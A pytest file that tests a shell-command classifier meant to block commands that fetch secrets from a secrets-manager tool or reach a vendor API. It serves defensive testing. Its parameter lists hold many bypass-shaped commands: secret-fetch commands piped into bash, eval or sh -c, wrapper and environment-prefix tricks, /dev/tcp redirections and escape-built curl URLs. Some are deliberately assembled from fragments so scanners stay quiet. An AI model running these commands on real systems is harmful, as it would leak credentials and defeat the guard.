# SPDX-License-Identifier: Apache-2.0
"""The shell material rule keeps its old denial and relaxes it only on a positive proof (#388, round 2).

The default is the old rule: the secret tool, a project or config name, an expansion or backtick, or a word built from
escapes, anywhere in the command, is denied. It is relaxed only when the whole command is made of commands on a short
allowlist (commit message and issue or pull request body options, a file-writing here-document, grep, echo and printf
and a few read-only ones) and every protected word sits in a quoted argument, a path, a here-document body or a
comment of one of them. Any shell form the parser does not model means deny.

Every protected word and every denying shape is built from fragments at run time: no bypass input is written whole in
this file, so scanners stay quiet about it.
"""

from __future__ import annotations

import pytest

from safo import geminibrief

TOOL = "dop" + "pler"
CFG = "pr" + "d"
PAID = "prd" + "_paid"
PROJECT = "image" + "-gen"
KEY = "GEMINI" + "_API" + "_KEY"
HOST = "generative" + "language" + ".googleapis" + ".com"
ESC = "\\u00e9"
WRAPPER = "safo " + "gemini " + "ask --model m --prompt-file /dev/stdin --job j"
GET = f"{TOOL} secrets get $K --plain"
GET_NAMED = f"{TOOL} secrets get PRIVATE_SCREENING --plain"
SH = "ba" + "sh"
RUNNER = "sys" + "tem"


def denied(command: str) -> bool:
    return geminibrief.shell_command_class(command) is not None


@pytest.mark.parametrize(
    "command",
    [
        # issue 388 shapes: the project or config named, a dollar-paren in a heredoc or printf, an escape beside gh
        f'gh issue comment 5 --body "read it from {TOOL}, config {CFG}, then rotate"',
        f"gh issue comment 5 --body 'the {TOOL} project {PROJECT} and config {PAID} are described in the docs'",
        f"printf '%s\\n' \"{TOOL} said $(date)\"",
        f"cat <<EOF\nnote about {TOOL} and $HOME and $(date)\nEOF",
        f"gh issue comment 5 --body $'caf{ESC} then go to http docs, see {TOOL}'",
        "gh pr comment 3 --body \"$(printf '\\x1b[0m') done, ssh and node are fine\"",
        f"echo $'\\x41' | grep -c {TOOL}",
        # a name as a path, a pattern or a comment
        f"cat docs/gemini-keys.md | grep {PROJECT}",
        f"grep -rn {TOOL} src docs/$X",
        f"grep -rn . ~/.config/safo # {PROJECT}",
        f"cat ~/.config/safo/gemini.yaml # {PAID}",
        f"make check PY=python # {PAID}",
        f"make check # {TOOL} secrets get $K --config {CFG}",
    ],
)
def test_prose_paths_and_comments_are_allowed(command: str) -> None:
    assert geminibrief.shell_command_class(command) is None, command


@pytest.mark.parametrize(
    "command",
    [
        # text handed to a shell to run (Daybreak finding 1: pipe, here-string, eval, and the like)
        f"printf '%s' '{GET} | {WRAPPER}' | {SH}",
        f"{SH} <<< '{GET} | {WRAPPER}'",
        f"eval '{GET} | {WRAPPER}'",
        f"echo '{GET}' | sh",
        f"echo '{TOOL} run -p {PROJECT} -- env' | sh",
        f'eval "{TOOL} secrets --config {PAID}"',
        f"echo '{GET}' > /tmp/x; source /tmp/x",
        f"echo '{GET}' > /tmp/x; . /tmp/x",
        f"echo '{GET}' | python3",
        f"cat <<'EOF' | {SH}\n{GET}\nEOF",
        f"{SH} -c '{GET}'",
        f'sh -c "{TOOL} secrets get X --config {CFG}"',
        f"python3 -c 'import os; os.{RUNNER}(\"{GET}\")'",
        f"perl -e 'system(q({GET}))'",
        f"echo '{GET}' | xargs {SH} -c",
        f"find . -exec {SH} -c '{GET}' ;",
        f"echo '{GET}' | tee /tmp/x | {SH}",
        # runtime indirection and wrappers (Daybreak finding 2)
        f"D={TOOL}; $D secrets get PRIVATE_SCREENING --plain | {WRAPPER}",
        f"timeout 5 {GET} | {WRAPPER}",
        f"CMD='{GET_NAMED} | {WRAPPER}'; {SH} -c \"$CMD\"",
        f"nice {GET}",
        f"stdbuf -o0 {GET}",
        f"strace -f {GET}",
        f"ionice {GET}",
        f"{TOOL} --version; echo $HOME",
        f"{TOOL} --version && echo $(date)",
        f"echo hi; {GET}",
        f"echo $({GET})",
        f"echo `{GET}`",
        f'echo "$({GET})"',
        f"X=$({GET}); echo ok",
        f"echo '{TOOL}' > /tmp/x; $(cat /tmp/x) secrets get $K",
        f"$(echo {TOOL}) secrets get $K --config {CFG}",
        # environment selection and assignment prefixes (Daybreak finding 3)
        f"DOPPLER_PROJECT={PROJECT} {GET_NAMED} | {WRAPPER}",
        f"DOPPLER_CONFIG={CFG} {GET_NAMED} | {WRAPPER}",
        f"env DOPPLER_PROJECT={PROJECT} {GET_NAMED}",
        f"env DOPPLER_CONFIG={CFG} {GET_NAMED}",
        f'sudo env X=1 {TOOL} run -- {SH} -c "$(cat f)"',
        f"FOO=1 {TOOL} secrets get X --config {CFG}",
        f"DOPPLER_PROJECT={PROJECT} echo ok",
        f"{TOOL} run --project {PROJECT} --config x -- env",
        f"{TOOL} secrets --config {PAID}",
        f"echo ok; {TOOL} secrets get X -p {PROJECT}",
        f"{GET}",
        f"{TOOL} secrets get `echo K` --plain",
        f"{TOOL} secrets get X --config {CFG} --plain",
        f"safo gemini ask --model m --prompt-file docs/{PAID}.md --job j",
        # the escape-built word beside a run network tool
        "curl $'\\x68ttps://example.test/'",
        "cat f | curl -d @- $'\\x68ttps://example.test/'",
        "echo ok && wget $'\\u0068ttp://example.test/'",
        "printf -v H %s%s gener ativelanguage; curl https://$H.example.test",
        "python3 -c 'print(1)' $'\\x41'",
        # the vendor host and key variable are never relaxed
        f"curl https://{HOST}",
        f"echo ${{{KEY}}}",
        f"git commit -m 'host {HOST}'",
    ],
)
def test_a_command_outside_the_proof_keeps_the_old_denial(command: str) -> None:
    assert denied(command), command


# One protected word in prose, plus one construct the allowlist does not cover. Each of these would be allowed without
# the construct, so a denial proves the construct is what bites.
PROSE = f"echo '{TOOL} {CFG} {PROJECT}'"


@pytest.mark.parametrize(
    "command",
    [
        f"{PROSE} | {SH}",
        f"{PROSE} | sh -s",
        f"{PROSE} | zsh",
        f"{PROSE} | python3 -",
        f"{PROSE} | env {SH}",
        f"{PROSE} | /bin/{SH}",
        f"{PROSE} | xargs echo",
        f"{PROSE} | xargs -I{{}} {SH} -c {{}}",
        f"{SH} <<< {PROSE}",
        f"python3 <<< {PROSE}",
        f"{SH} <<'EOF'\n{TOOL} {CFG}\nEOF",
        f"{SH} < /tmp/x; {PROSE}",
        f"{PROSE}; eval x",
        f"{PROSE}; source x",
        f"{PROSE}; . x",
        f"{PROSE}; exec x",
        f"{PROSE} && {SH} -c x",
        f"{PROSE} || node -e x",
        f"{PROSE}; ruby -e x",
        f"{PROSE}; perl -e x",
        f"{PROSE}; php -r x",
        f"{PROSE}; find . -exec ls ;",
        f"{PROSE}; find . -execdir ls ;",
        f"{PROSE}; xargs ls",
        f"{PROSE}; $X",
        f"{PROSE}; $X arg",
        f"{PROSE}; ${{X}} arg",
        f"{PROSE}; $(echo x) arg",
        f"{PROSE}; `echo x` arg",
        f"{PROSE}; X=1",
        f"{PROSE}; X=1 echo hi",
        f"{PROSE}; env echo hi",
        f"{PROSE}; timeout 5 echo hi",
        f"{PROSE}; nice echo hi",
        f"{PROSE}; command echo hi",
        f"{PROSE}; builtin echo hi",
        f"{PROSE}; sudo echo hi",
        f"{PROSE}; nohup echo hi",
        f"{PROSE}; time echo hi",
        f"{PROSE}; \\echo hi",
        f"{PROSE}; 'echo' hi",
        f"{PROSE}; ec''ho hi",
        f"{PROSE}; {{ echo hi; }}",
        f"{PROSE}; (echo hi)",
        f"{PROSE}; if true; then echo hi; fi",
        f"{PROSE} &",
        f"{PROSE} |& cat",
        f"{PROSE} > /dev/tcp/host/1",
        f"{PROSE} > /dev/udp/host/1",
        f"{PROSE} > $X",
        f"{PROSE} >> /dev/tcp/host/1",
        f"cat < /dev/tcp/host/1; {PROSE}",
        f"{PROSE} > >(cat)",
        f"{PROSE} <(cat)",
        f'{PROSE} "$(ls)"',
        f'{PROSE} "$(echo $(date))"',
        f'{PROSE} "$(date; ls)"',
        f'{PROSE} "`date`"',
        f'{PROSE} "${{X:-$(ls)}}"',
        f'{PROSE} "${{X@P}}"',
        f"{PROSE} $((1+1))",
        f"{PROSE} 'unterminated",
        f'{PROSE} "unterminated',
        f"{PROSE} $'unterminated",
        f"cat <<'EOF'\nbody {TOOL} {CFG}\n",
        f"cat <<EOF\nbody {TOOL} {CFG} $(ls)\nEOF",
        f"cat <<EOF\nbody {TOOL} {CFG} `ls`\nEOF",
        f"cat <<EOF\nbody {TOOL} {CFG} ${{X@P}}\nEOF",
        f"{PROSE} \\\nand more",
        f"{PROSE} # comment \\\n{TOOL} secrets get $K",
        f"{PROSE}\x00",
        f"{PROSE}\r",
        f"echo{chr(0x200B)} '{TOOL} {CFG}'",
        f"printf -v X %s '{TOOL} {CFG}'; echo '{TOOL} {CFG}'",
        f"rg --pre=x -n '{TOOL} {CFG}' .",
        f"rg --pre x -n '{TOOL} {CFG}' .",
        f"rg --pr=x -n '{TOOL} {CFG}' .",
        f"rg --hostname-bin=x -n '{TOOL} {CFG}' .",
        f"rg --hos=x -n '{TOOL} {CFG}' .",
        f"rg $OPT -n '{TOOL} {CFG}' .",
        f'rg "$OPT" -n "{TOOL} {CFG}" .',
        f"git -c core.pager=x commit -m '{TOOL} {CFG}'",
        f"git --exec-path=x commit -m '{TOOL} {CFG}'",
        f"git commit -m 'x'; git grep -O x '{TOOL} {CFG}'",
        f"git diff --ext-diff '{TOOL} {CFG}'",
        f"gh api /x -f body='{TOOL} {CFG}'",
        f"gh alias set x '!echo {TOOL} {CFG}'",
        f"gh extension exec x '{TOOL} {CFG}'",
        f"cat > ~/.bashrc <<'EOF'\n{TOOL} {CFG}\nEOF; {SH}",
        f"{PROSE}; cat <<'EOF' | {SH}\nx\nEOF",
        f"cat <<'EOF'\n{TOOL} {CFG}\nEOF\n{SH} -c x",
        f"cat <<'EOF'\n{TOOL} {CFG}\nEOF\n{TOOL} secrets get $K",
        f"cat <<'EOF'\n{TOOL} {CFG}\nEOF\n{SH} x",
        f"cat <<EOF'\n{TOOL} {CFG}\nEOF",
        f"cat <<-EOF\n\t{TOOL} {CFG}\n\tEOF\n{SH} x",
        f"echo {TOOL} {CFG} 2>&1 | {SH}",
        f"echo '{TOOL} {CFG}' ;; echo",
        f"echo '{TOOL} {CFG}' <&0 | {SH}",
        f"echo '{TOOL} {CFG}' <> /dev/tcp/h/1",
    ],
)
def test_one_construct_outside_the_allowlist_means_deny(command: str) -> None:
    assert denied(command), command


def test_the_prose_base_is_allowed_alone() -> None:
    # the control for the list above: without any construct the same prose is allowed
    assert geminibrief.shell_command_class(PROSE) is None
    assert geminibrief.shell_command_class(PROSE + " 2>&1") is None
    assert geminibrief.shell_command_class(PROSE + " > /dev/null") is None
    assert geminibrief.shell_command_class(PROSE + " # trailing comment") is None
    assert geminibrief.shell_command_class(f"cat <<'EOF'\n{TOOL}\nXEOF\n{SH} x\nEOF") is None  # all of it is the body


def test_each_allowed_command_is_denied_the_moment_its_name_is_one_letter_off() -> None:
    # the allowlist is exact words; a lookalike or a path-qualified command word is not on it
    assert denied(f"ech0 '{TOOL} {CFG}'")
    assert denied(f"/bin/echo '{TOOL} {CFG}'")
    assert denied(f"e\\cho '{TOOL} {CFG}'")
    assert denied(f"{chr(0xFF45)}{chr(0xFF43)}{chr(0xFF48)}{chr(0xFF4F)} '{TOOL} {CFG}'")


def test_a_comment_hides_nothing_that_runs() -> None:
    # a `#` in the middle of a word is not a comment, and a quoted one is not either
    assert denied(f"echo a#b; {GET}")
    assert denied(f"echo '# x'; {GET}")
    assert denied(f'echo "# x"; {GET}')
    assert denied(f"echo $'#'; {GET}")
    assert denied(f"echo x\n{GET} # {CFG}")
    assert geminibrief.shell_command_class(f"echo x # {GET} {CFG}") is None


def test_a_long_command_and_the_deadline_still_fail_closed() -> None:
    assert geminibrief.shell_command_class("x" * (geminibrief.SHELL_CAP + 1)) == geminibrief.SHELL_UNVERIFIED
    assert geminibrief.shell_command_class(PROSE, deadline=0.0) == geminibrief.SHELL_UNVERIFIED


def test_the_parser_never_raises_on_hostile_text() -> None:
    parts = ["'", '"', "$(", "`", "<<", "EOF", "\n", "\\", "#", "|", ";", "&", "(", ")", "$'", "${", "x", " ", "\x00"]
    for i in range(3000):
        text = "".join(parts[(i * 7 + j * 13 + i // 5) % len(parts)] for j in range(1 + i % 23))
        assert geminibrief.shell_command_class(f"echo {TOOL} " + text) in (None, *_CLASSES)


_CLASSES = (
    geminibrief.SHELL_VENDOR,
    geminibrief.SHELL_KEY,
    geminibrief.SHELL_STORE,
    geminibrief.SHELL_BUILT,
    geminibrief.SHELL_TOOL,
    geminibrief.SHELL_BROKER_MODULE,
    geminibrief.SHELL_UNVERIFIED,
)
